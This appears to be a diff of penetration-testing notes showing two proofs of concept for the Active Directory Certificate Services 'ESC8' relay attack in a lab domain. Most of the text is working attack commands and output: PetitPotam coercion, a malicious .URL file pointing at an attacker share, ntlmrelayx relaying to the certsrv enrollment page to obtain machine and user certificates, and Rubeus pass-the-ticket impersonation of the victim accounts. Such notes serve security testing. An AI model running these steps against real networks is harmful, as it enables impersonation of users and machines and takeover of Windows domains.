@@ -27,7 +27,7 @@ Various tools can be used to identify and exploit the "ESC8" vulnerability
 
 
 ==========================================================================================================================================
-PoC 1 - Basic test with the tools "Certify.exe", "PetitPotam.py", "Ntlmrelayx.py" and "Rubeus.exe"
+PoC 1 - Basic exploitation of the "ESC8" vulnerability with the tools "Certify.exe", "PetitPotam.py", "Ntlmrelayx.py" and "Rubeus.exe"
 ==========================================================================================================================================
 
 -------------------------------------------------------------------------------------------------------------------------------------
@@ -132,8 +132,9 @@ C:\temp> Certify.exe cas /domain:company.work /ldapserver:dc1.company.work /path
 Certify completed in 00:00:18.1508451
 
 
-Then validate that the Certificate Authority Web Enrollment is enabled and working by browsing the following URL:
------------------------------------------------------------------------------------------------------------------
+Verify that the Certificate Authority Web Enrollment is enabled and working by browsing the following URL:
+-----------------------------------------------------------------------------------------------------------
+=> http://<ca-server>/certsrv/certfnsh.asp
 => http://dc1.company.work/certsrv/certfnsh.asp or http://192.168.1.167/certsrv/certfnsh.asp
 
 
@@ -163,7 +164,8 @@ jeff@kali:~/Documents/Tools$ python3 ./PetitPotam.py -u lowprivdomainuser -p Wel
 [+] Attack worked!
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------
-Step 3. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim server to the ADCS and collect a certificate for the victim server
+Step 3. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim server to the ADCS HTTP endpoint (http://ca-server/certsrv/certfnsh.asp)
+        and obtain a certificate for the victim server
 ------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/impacket/examples$ sudo python3 ./ntlmrelayx.py -t http://192.168.1.167/certsrv/certfnsh.asp -smb2support --adcs --template Machine
@@ -222,6 +224,7 @@ Zw824vsu6rvqjiPaiPioSt8rhVCgeaJfb/6JW7sHbvII/8Stk9EpkTP7r4XxzJcqK4/G0tJ48nxawVMo
 => The attack worked and we collected a certificate for the victim machine account "COMPANY\ORACLESERVER1$". 
 
 
+--------------------------------------------------------------------------------------------------------
 Step 4. Impersonate the victim machine account "COMPANY\ORACLESERVER1$" using the tool "Rubeus.exe"
 --------------------------------------------------------------------------------------------------------
 
@@ -229,10 +232,49 @@ C:\temp> .\Rubeus.exe asktgt /outfile:kirbi /user:ORACLESERVER1$ /ptt /certifica
 
 
 ==========================================================================================================================================
-PoC 2 - Basic test with a ".URL" file and the tools "Ntlmrelayx.py" and "Rubeus.exe"
+PoC 2 - Basic exploitation of the "ESC8" vulnerability with a ".URL" file and the tools "Certutil", "Ntlmrelayx.py" and "Rubeus.exe"
 ==========================================================================================================================================
 
-Step 1. Add a malicious ".URL" file in an unrestricted network file share that will coerce victim users (when they browse the file share) 
+-------------------------------------------------------------------------------------------------------------------------------------
+Step 1. Validate that the AD Certificate Services are running and that the Certificate Authority Web Enrollment is enabled 
+-------------------------------------------------------------------------------------------------------------------------------------
+
+You can use certutil to:
+- dump and display certification authority (CA) configuration information, 
+- configure Certificate Services,
+- backup and restore CA components,
+- verify certificates, key pairs, and certificate chains.
+
+C:\temp> certutil
+
+Entry 0:
+  Name:                         `company-DC1-CA'
+  Organizational Unit:          `'
+  Organization:                 `'
+  Locality:                     `'
+  State:                        `'
+  Country/region:               `'
+  Config:                       `DC1.company.work\company-DC1-CA'
+  Exchange Certificate:         `'
+  Signature Certificate:        `'
+  Description:                  `'
+  Server:                       `DC1.company.work'
+  Authority:                    `company-DC1-CA'
+  Sanitized Name:               `company-DC1-CA'
+  Short Name:                   `company-DC1-CA'
+  Sanitized Short Name:         `company-DC1-CA'
+  Flags:                        `1'
+  Web Enrollment Servers:       `'
+CertUtil: -dump command completed successfully.
+
+
+Verify that the ADCS Certificate Authority Web Enrollment is enabled and working by browsing the following URL:
+=> http://<ca-server>/certsrv/certfnsh.asp
+=> http://dc1.company.work/certsrv/certfnsh.asp or http://192.168.1.167/certsrv/certfnsh.asp
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Step 2. Add a malicious ".URL" file in an unrestricted network file share that will coerce victim users (when they browse the file share) 
         to authenticate to a Kali Linux machine running the tool "ntlmrelayx.py"
 ------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -244,8 +286,10 @@ IconFile=\\192.168.1.30\share\auditor.ico
 IconIndex=1
 
 
-Step 2. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim users to the ADCS and collect a certificate for the victim users
-------------------------------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3. Use the tool "ntlmrelayx.py" to relay the authentication request from the victim users to the ADCS HTTP endpoint (http://ca-server/certsrv/certfnsh.asp)
+        and obtain a certificate for the victim users
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 jeff@kali:~/Documents/Tools/impacket/examples$ sudo python3 ./ntlmrelayx.py -t http://192.168.1.167/certsrv/certfnsh.asp -smb2support --adcs --template User
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
@@ -305,7 +349,8 @@ e/6Zkq4TrEWiC69wecFyOUC7UbItLCpF1xWvl8UJA1sdB4LHrKh/n70xxA4BHvN1yaRlOQrUczF3Dg04
 => The attack worked and we collected a certificate for the victim user account "COMPANY\CLAUDIA.CARDINALE". 
 
 
-Step 3. Impersonate the victim user account using the tool "Rubeus.exe"
+-------------------------------------------------------------------------------------
+Step 4. Impersonate the victim user account using the tool "Rubeus.exe"
 -------------------------------------------------------------------------------------
 
 C:\temp> .\Rubeus.exe asktgt /outfile:kirbi /user:CLAUDIA.CARDINALE /ptt /certificate:MIIRrQIBAzCCEWcGCSqGSIb3DQEHA<SNIP>
